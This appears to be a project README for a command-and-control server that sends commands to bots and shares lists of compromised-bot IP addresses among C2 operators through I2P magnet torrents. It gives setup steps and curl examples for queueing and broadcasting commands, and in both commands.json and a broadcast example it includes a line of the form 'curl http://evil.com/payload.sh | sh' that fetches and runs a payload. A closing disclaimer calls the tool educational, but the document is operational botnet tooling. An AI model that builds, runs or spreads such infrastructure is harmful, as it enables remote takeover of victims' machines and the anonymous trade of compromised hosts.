

# 📘 C2 Server over I2P with Bot Sharing via Magnet Torrents

---

## 🔧 Overview

This Command-and-Control (C2) server allows operators to:

* Control bots over the public internet.
* Seamlessly share bots with **other C2 servers** through **I2P** torrents (via magnet links).
* Use `i2psnark` to fetch and seed peer `.txt` files containing IPs of bots.
* Store all bot information in `bots.txt` automatically (from all peers).
* Send commands to a specific bot or **broadcast** to all online bots.

This system requires **no registration**, has **no central authority**, and functions as a **decentralized, anonymous C2 federation** over the I2P network.

---

## 🛠️ Prerequisites

### ✅ Operating System

* Debian-based Linux (Ubuntu, Kali, Debian)
* Works on VPS, dedicated, or I2P-enabled hidden nodes

### ✅ Dependencies

* Python 3.8+
* `flask` and `requests` Python libraries
* I2P with **i2psnark** enabled

### ✅ Python Packages

Install dependencies:

```bash
sudo apt update
sudo apt install python3-pip curl -y
pip3 install flask requests
```

---

## 🌐 I2P Setup

1. **Install I2P** (Debian/Ubuntu):

   ```bash
   sudo apt install i2p
   ```

2. **Run I2P Router:**

   ```bash
   i2prouter start
   ```

3. Access I2P router console in your browser:

   ```
   http://127.0.0.1:7657
   ```

4. Go to **i2psnark**:

   ```
   http://127.0.0.1:7657/i2psnark/
   ```

---

## 📁 Project Structure

```
c2/
├── c2_server.py           # Main C2 server
├── magnet_links.txt       # Magnet links to join other C2's shared bots
├── shared_bots/           # Shared files (peer .txt files with bot IPs)
├── bots.txt               # Master list of known bots (local + shared)
└── commands.json          # Commands assigned to each bot
```

---

## 🔌 Setup & Running the Server

1. **Clone or place the files** in your server's working directory.

2. **Add magnet links** from other C2s in `magnet_links.txt`:

   ```
   magnet:?xt=urn:btih:EXAMPLEMAGNET1
   magnet:?xt=urn:btih:EXAMPLEMAGNET2
   ```

3. **Run the server:**

   ```bash
   python3 c2_server.py
   ```

---

## 📡 Features & Functionality

### 📥 `magnet_links.txt`

* This file contains a list of **I2P magnet links** to shared `.torrent` files from other C2s.
* Each torrent contains a `.txt` file with bot IPs.
* On launch, the server adds these to `i2psnark` via its local HTTP API.

---

### 📂 `shared_bots/` folder

* This is where i2psnark downloads `.txt` files from the shared torrents.
* Each file contains IP addresses of bots collected by other C2 servers.
* These are merged into `bots.txt` automatically every 60 seconds.

---

### 📜 `bots.txt`

* A master bot list (deduplicated) combining:

  * Your manually added bots
  * Peer-shared bots from `shared_bots/`

---

### 📦 `commands.json`

* Stores commands for each bot in this format:

  ```json
  {
    "bot1_public_ip": "curl http://evil.com/payload.sh | sh",
    "bot2_public_ip": "echo 'hi'"
  }
  ```

---

## 🧪 Usage Examples

### ➕ Add a command for a specific bot

```bash
curl -X POST http://localhost:8080/sendcmd \
     -H "Content-Type: application/json" \
     -d '{"botid": "154.65.100.201", "cmd": "whoami"}'
```

---

### 📢 Broadcast a command to all bots

```bash
curl -X POST http://localhost:8080/broadcast \
     -H "Content-Type: application/json" \
     -d '{"cmd": "curl http://evil.com/payload.sh | sh"}'
```

---

### 🤖 How bots fetch commands

Each bot should make requests like:

```
GET http://C2_IP:8080/getcmd/123.45.67.89
```

The server will respond with the latest command or an empty string.

---

## 📡 How I2P Sharing Works

1. Your C2 server:

   * Loads magnet links to shared `.torrent` files.
   * Downloads `.txt` files (with IPs of bots) via i2psnark.

2. Other C2s do the same:

   * They join your torrents and see your shared `shared_bots/local.txt`.

3. This builds a **mesh of shared botnets** using `.txt` files as simple syncing mediums.

---

## 🧷 How to Seed Your Own Bot List

1. Inside `shared_bots/`, create a file like `local.txt`:

   ```
   123.45.67.89
   11.22.33.44
   ```

2. Create a `.torrent` for `shared_bots/` folder using `i2psnark`.

3. Copy the generated **magnet link** from i2psnark, and give it to other C2 operators.

They can then add it to their own `magnet_links.txt` and receive your bot list.

---

## 🔐 Security & Anonymity

* Uses **I2P** to avoid public IP leakage between C2 servers.
* No central coordination — purely peer-to-peer.
* No usernames, passwords, or registration — just magnet links.
* Commands are only executed on bots reachable on the **clearnet**.

---

## ❗ Warnings (Ethical Use)

This system is designed **strictly for educational use, authorized testing, or simulations**. Misuse for illegal botnet control is a crime in most jurisdictions.

---

## 🧩 To Do / Optional Features

* Add encryption/signature verification for commands.
* Add an authentication mechanism (e.g., per bot token).
* Add reply/report channel for bots.
* Auto-generate `.torrent` files from CLI.

